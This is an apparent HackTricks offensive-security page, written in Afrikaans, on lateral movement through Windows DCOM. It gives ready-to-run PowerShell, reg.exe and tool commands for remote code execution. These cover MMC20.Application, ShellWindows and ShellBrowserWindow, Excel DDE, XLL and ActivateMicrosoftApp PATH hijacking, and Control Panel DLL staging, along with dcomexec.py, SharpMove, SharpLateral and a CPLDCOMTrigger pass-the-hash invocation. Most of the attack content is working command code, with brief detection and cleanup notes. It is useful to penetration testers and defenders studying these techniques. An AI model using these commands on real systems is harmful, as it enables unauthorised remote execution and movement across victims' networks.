# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM-laterale beweging is aantreklik omdat dit bestaande COM-bedieners hergebruik wat oor RPC/DCOM blootgestel word, eerder as om ’n diens of geskeduleerde taak te skep. In die praktyk beteken dit dat die aanvanklike verbinding gewoonlik op TCP/135 begin en dan na dinamies toegewysde hoë RPC-poorte beweeg.

## Voorvereistes en slaggate

- Jy het gewoonlik ’n plaaslike administrateurkonteks op die teiken nodig, en die afgeleë COM-bediener moet afgeleë bekendstelling/aktivering toelaat.
- Sedert **14 Maart 2023** dwing Microsoft DCOM-verharding op ondersteunde stelsels af. Ou kliënte wat ’n lae aktiveringsverifikasievlak versoek, kan misluk tensy hulle ten minste `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` onderhandel. Moderne Windows-kliënte se vlak word gewoonlik outomaties verhoog, dus werk huidige nutsgoed gewoonlik steeds.<sup>[[3]](#references)</sup>
- Handmatige of geskiptete DCOM-uitvoering benodig gewoonlik TCP/135 plus die teiken se dinamiese RPC-poortreeks. As jy Impacket se `dcomexec.py` gebruik en opdraguitvoer wil terugkry, benodig jy gewoonlik ook SMB-toegang tot `ADMIN$` (of ’n ander deelhulpbron waarop gelees en geskryf kan word).
- As RPC/DCOM werk maar SMB geblokkeer word, kan `dcomexec.py -nooutput` steeds nuttig wees vir blinde uitvoering.

Vinnige kontroles:

```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```

## MMC20.Application

Vir meer inligting oor hierdie tegniek, kyk na die [oorspronklike MMC20.Application-plasing](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/).<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM)-voorwerpe bied interessante moontlikhede vir netwerkgebaseerde interaksies met voorwerpe. Microsoft verskaf omvattende dokumentasie vir beide DCOM en Component Object Model (COM), wat [hier vir DCOM](https://msdn.microsoft.com/en-us/library/cc226801.aspx) en [hier vir COM](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>) beskikbaar is. ’n Lys van DCOM-toepassings kan met die PowerShell-opdrag verkry word:

```bash
Get-CimInstance Win32_DCOMApplication
```

Die COM-objek [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) maak dit moontlik om MMC-snap-in-bewerkings met skripte te beheer. Hierdie objek bevat veral ’n `ExecuteShellCommand`-metode onder `Document.ActiveView`. Meer inligting oor hierdie metode is [hier](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>) beskikbaar. Kyk hoe dit loop:<sup>[[6]](#references)</sup>

Hierdie kenmerk maak dit moontlik om opdragte oor ’n netwerk deur ’n DCOM-toepassing uit te voer. PowerShell kan soos volg gebruik word om as ’n admin op afstand met DCOM te kommunikeer:

```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```

Hierdie opdrag koppel aan die DCOM-toepassing en gee ’n instansie van die COM-objek terug. Die ExecuteShellCommand-metode kan dan aangeroep word om ’n proses op die afgeleë gasheer uit te voer. Die proses behels die volgende stappe:

Kontroleer metodes:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```

Kry RCE:

```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
    "cmd.exe",
    $null,
    "/c powershell -NoP -W Hidden -Enc <B64>",
    "7"
)
```

Die laaste argument is die vensterstyl. `7` hou die venster geminimaliseer. In die praktyk lei MMC-gebaseerde uitvoering dikwels daartoe dat ’n afgeleë `mmc.exe`-proses jou payload voortbring, wat verskil van die Explorer-gesteunde objekte hieronder.

## ShellWindows & ShellBrowserWindow

**Vir meer inligting oor hierdie tegniek, sien die oorspronklike plasing [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

Daar is waargeneem dat die **MMC20.Application**-objek nie ’n toepassingspesifieke `LaunchPermission`-waarde het nie.<sup>[[2]](#references)</sup> Dit verleen nie op sigself toegang nie: COM kontroleer die masjien se `DefaultLaunchPermission` ACL en, waar van toepassing, masjienwye beperkings op bekendstelling en toegang.<sup>[[9]](#references)[[10]](#references)</sup> Vir verdere besonderhede kan ’n draad [hier](https://twitter.com/tiraniddo/status/817532039771525120) nagegaan word, en dit word aanbeveel om [@tiraniddo](https://twitter.com/tiraniddo) se OleView .NET te gebruik om objekte sonder ’n eksplisiete Launch Permission te filter.

Twee spesifieke objekte, `ShellBrowserWindow` en `ShellWindows`, is uitgelig omdat hulle nie eksplisiete Launch Permissions het nie.<sup>[[2]](#references)</sup> ’n Ontbrekende `LaunchPermission`-waarde onder `HKCR:\AppID\{guid}` beteken dat daar geen toepassingspesifieke bekendstellings-ACL is nie; dit beteken **nie** dat aktivering op afstand onbeperk is nie.<sup>[[9]](#references)[[10]](#references)</sup>

In vergelyking met `MMC20.Application` is hierdie objekte dikwels stiller vanuit ’n OPSEC-perspektief, omdat die opdrag op die afgeleë gasheer dikwels ’n kindproses van `explorer.exe` word, eerder as van `mmc.exe`.

### ShellWindows

Vir `ShellWindows`, wat nie ’n ProgID het nie, vergemaklik die .NET-metodes `Type.GetTypeFromCLSID` en `Activator.CreateInstance` die instansiëring van die objek met behulp van sy CLSID. Hierdie proses gebruik OleView .NET om die CLSID vir `ShellWindows` te verkry. Sodra die objek geïnstantieer is, is interaksie daarmee moontlik via die `WindowsShell.Item`-metode, wat lei tot metode-aanroepe soos `Document.Application.ShellExecute`.<sup>[[2]](#references)</sup>

Voorbeeld van PowerShell-opdragte is gegee om die objek te instansieer en opdragte op afstand uit te voer:

```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```

### ShellBrowserWindow

`ShellBrowserWindow` is soortgelyk, maar jy kan dit direk via sy CLSID instansieer en pivot na `Document.Application.ShellExecute`:

```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
    "cmd.exe",
    "/c whoami > C:\\Windows\\Temp\\dcom.txt",
    "C:\\Windows\\System32",
    $null,
    0
)
```

### Lateral Movement met Excel DCOM Objects

Lateral movement kan bereik word deur Excel DCOM-objects uit te buit. Vir gedetailleerde inligting is dit raadsaam om die bespreking oor die benutting van Excel DDE vir lateral movement via DCOM by [Cybereason se blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom) te lees.<sup>[[5]](#references)</sup>

Die Empire-projek verskaf ’n PowerShell-script wat demonstreer hoe Excel gebruik kan word vir remote code execution (RCE) deur DCOM-objects te manipuleer. Hieronder is brokkies uit die script wat beskikbaar is op [Empire se GitHub-bewaarplek](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1), wat verskillende metodes wys om Excel vir RCE te misbruik:

```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $isx64 = [boolean]$obj.Application.ProductCode[21]
    Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
    $Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
    $Obj = [System.Activator]::CreateInstance($Com)
    $Obj.DisplayAlerts = $false
    $Obj.DDEInitiate("cmd", "/c $Command")
}
```

Onlangse navorsing het hierdie area uitgebrei met Excel.Application se `ActivateMicrosoftApp()`-metode. Die kernidee is dat Excel kan probeer om verouderde Microsoft-toepassings soos FoxPro, Schedule Plus of Project te begin deur die stelsel se `PATH` te deursoek. As ’n operateur ’n payload met een van daardie verwagte name op ’n skryfbare plek kan plaas wat deel is van die teiken se `PATH`, sal Excel dit uitvoer.<sup>[[4]](#references)</sup>

Vereistes vir hierdie variasie:

- Plaaslike admin op die teiken
- Excel geïnstalleer op die teiken
- Die vermoë om ’n payload na ’n skryfbare gids in die teiken se `PATH` te skryf

Praktiese voorbeeld wat die FoxPro-opsoek misbruik (`FOXPROW.exe`):

```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```

As die plaaslike `Excel.Application` ProgID nie op die aanvallende gasheer geregistreer is nie, instansieer eerder die afgeleë objek via CLSID:

```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```

Waardes wat in die praktyk misbruik is:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — laai ’n geregistreerde Control Panel-DLL

Die `COpenControlPanel`-klas (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) stel `IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`) beskikbaar. Sy `Open()`-metode veroorsaak dat Control Panel-DLL’s wat onder die `Control Panel\Cpls`-sleutel geregistreer is, deur ’n afgeleë `dllhost.exe` gelaai word. Die klas het op getoetste stelsels geen eksplisiete launch/access permissions nie, en erf dus die verstek DCOM-beleid (wat normaalweg ’n administrateur vir afgeleë aktivering vereis). ’n Ewekansige itemnaam is genoeg om `Open()` die geregistreerde DLL’s te laat verwerk; die payload hoef nie ’n `.cpl`-uitbreiding te hê nie, maar moet ’n geldige DLL van die korrekte argitektuur wees.<sup>[[7]](#references)</sup>

Hierdie primitive is **stage-and-trigger**, nie command-only execution nie: kopieer eers ’n DLL na die teiken en skep ’n `REG_EXPAND_SZ`-waarde wat daarna verwys, en aktiveer dan die objek oor DCOM. Byvoorbeeld, vanuit ’n administratiewe Windows-konteks:<sup>[[7]](#references)</sup>

```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```

Die openbare [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)-kliënt implementeer die ongedokumenteerde DCOM-oproep met Impacket. Dit is voldoende om ’n arbitrêre Control Panel-itemnaam te verskaf; die kliënt kan ’n RPC-fout rapporteer selfs al het dllhost.exe die DLL gelaai.<sup>[[8]](#references)</sup>

```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```

Operasioneel vereis hierdie pad ook ’n lêerskryfkanaal en afstandtoegang tot die register, dus is dit raseriger as `MMC20`/`ShellWindows`. Dit skep ’n volhardingseffek omdat die inskrywing weer gelaai kan word wanneer Control Panel later oopgemaak word. Verwyder die waarde ná uitvoering en soek na onverwagte waardes in `Control Panel\Cpls` saam met ongewone DLL-laaie in `dllhost.exe`.<sup>[[7]](#references)</sup>

```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```

### Outomatiseringsnutsgoed vir Lateral Movement

Twee nutsgoed word uitgelig om hierdie tegnieke te outomatiseer:

- **Invoke-DCOM.ps1**: ’n PowerShell-skrip wat deur die Empire-projek verskaf word en die aanroep van verskillende metodes om kode op afgeleë masjiene uit te voer, vereenvoudig. Hierdie skrip is by die Empire GitHub-bewaarplek beskikbaar.

- **SharpLateral**: ’n Nutsding wat ontwerp is om kode op afstand uit te voer en met die volgende opdrag gebruik kan word:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- [SharpMove](https://github.com/0xthirteen/SharpMove):

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```

## Outomatiese gereedskap

- Die Powershell-skrip [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) maak dit maklik om al die metodes wat in kommentaar aangedui is, te gebruik om kode op ander masjiene uit te voer.
- Jy kan Impacket se `dcomexec.py` gebruik om opdragte op afgeleë stelsels met DCOM uit te voer. Huidige weergawes ondersteun `ShellWindows`, `ShellBrowserWindow` en `MMC20`, en gebruik by verstek `ShellWindows`.

```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```

- Jy kan ook [**SharpLateral**](https://github.com/mertdas/SharpLateral) gebruik:

```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```

- Jy kan ook [**SharpMove**](https://github.com/0xthirteen/SharpMove) gebruik.

```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```





## References

- [1] [Lateral Movement deur die MMC20.Application COM Object te gebruik](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [Lateral Movement via DCOM: Ronde 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Bestuur veranderinge vir Windows DCOM Server Security Feature Bypass (CVE-2021-26414)](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement: Misbruik die krag van die DCOM Excel-toepassing](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [Benutting van Excel DDE vir lateral movement via DCOM](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC-toepassingsklas (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [Gebruik van DCOM-objekte vir afstandsuitvoering van opdragte](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
- [9] [DefaultLaunchPermission - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/com/defaultlaunchpermission)
- [10] [MS-DCOM: Bylaag B, Produkgedrag - Microsoft Learn](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/acc42954-4073-4f05-b850-efd562022077)
{{#include ../../banners/hacktricks-training.md}}
